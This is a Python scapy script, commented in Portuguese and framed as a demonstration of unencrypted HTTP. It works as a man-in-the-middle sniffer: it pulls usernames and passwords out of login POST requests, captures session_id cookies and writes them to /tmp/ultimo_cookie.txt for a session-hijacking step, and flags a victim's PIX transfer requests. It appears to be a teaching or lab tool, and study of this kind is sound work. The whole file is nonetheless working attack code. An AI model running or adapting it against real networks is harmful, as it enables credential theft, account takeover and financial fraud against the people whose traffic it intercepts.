#!/usr/bin/env python3
"""
Sniffer de Credenciais e Cookies de Sessão em Texto Claro
Demonstração empírica da ausência de criptografia e integridade (Stallings, 2014)
"""

import sys
import re
from scapy.all import sniff, TCP, Raw, IP

VERDE = "\033[92m"
VERMELHO = "\033[91m"
AMARELO = "\033[93m"
AZUL = "\033[94m"
CIANO = "\033[96m"
BOLD = "\033[1m"
RESET = "\033[0m"

COOKIE_FILE = "/tmp/ultimo_cookie.txt"

print(f"{VERMELHO}{BOLD}======================================================{RESET}")
print(f"{VERMELHO}{BOLD}  SNIFFER DE CREDENCIAIS & COOKIES DE SESSÃO (MITM)   {RESET}")
print(f"{VERMELHO}{BOLD}======================================================{RESET}")
print(f"Escutando tráfego HTTP interceptado na interface de rede...")
print(f"Aguardando a vítima acessar e se autenticar...\n")


def processar_pacote(pkt):
    if pkt.haslayer(Raw) and pkt.haslayer(IP) and pkt.haslayer(TCP):
        try:
            payload = pkt[Raw].load.decode("utf-8", errors="ignore")
        except Exception:
            return

        ip_src = pkt[IP].src
        ip_dst = pkt[IP].dst

        # 1. Detecção de Credenciais em Requisição POST de Login
        if "POST /login" in payload or ("usuario=" in payload and "senha=" in payload):
            print(f"\n{VERMELHO}{BOLD}[🚨 ALERTA CRÍTICO: CREDENCIAIS EM TEXTO CLARO CAPTURADAS! 🚨]{RESET}")
            print(f"  Origem: {ip_src} -> Destino: {ip_dst}")
            
            # Extrai usuario e senha via regex
            user_match = re.search(r"usuario=([^& \r\n]+)", payload)
            pass_match = re.search(r"senha=([^& \r\n]+)", payload)
            
            if user_match:
                print(f"  {BOLD}Usuário Interceptado:{RESET} {CIANO}{user_match.group(1)}{RESET}")
            if pass_match:
                print(f"  {BOLD}Senha Interceptada:{RESET}   {VERMELHO}{pass_match.group(1)}{RESET}")

        # 2. Detecção de Cookie de Sessão em Trânsito (Set-Cookie ou Cookie)
        if "session_id=" in payload:
            cookie_match = re.search(r"session_id=([a-zA-Z0-9_\-]+)", payload)
            if cookie_match:
                token = cookie_match.group(1)
                print(f"\n{AMARELO}{BOLD}[🔑 IDENTIFICADOR DE SESSÃO INTERCEPTADO EM TEXTO CLARO! 🔑]{RESET}")
                print(f"  Origem: {ip_src} -> Destino: {ip_dst}")
                print(f"  {BOLD}Token de Sessão:{RESET} {VERDE}{token}{RESET}")
                
                # Salva o cookie para uso imediato pelo script de Sequestro de Sessão
                with open(COOKIE_FILE, "w") as f:
                    f.write(token)
                print(f"  {CIANO}Token salvo automaticamente em {COOKIE_FILE} para Session Hijacking.{RESET}")

        # 3. Detecção de Requisições HTTP com URLs sensíveis
        if "GET /dashboard" in payload:
            print(f"{AZUL}[+] Vítima ({ip_src}) acessou o /dashboard via HTTP inseguro!{RESET}")
        elif "POST /transferir" in payload:
            print(f"{AMARELO}[+] Vítima ({ip_src}) submeteu uma transferência PIX via HTTP inseguro!{RESET}")


if __name__ == "__main__":
    try:
        sniff(filter="tcp port 80 or tcp port 8080 or tcp port 5000", prn=processar_pacote, store=False)
    except KeyboardInterrupt:
        print(f"\n{AMARELO}[!] Sniffer interrompido pelo usuário.{RESET}")
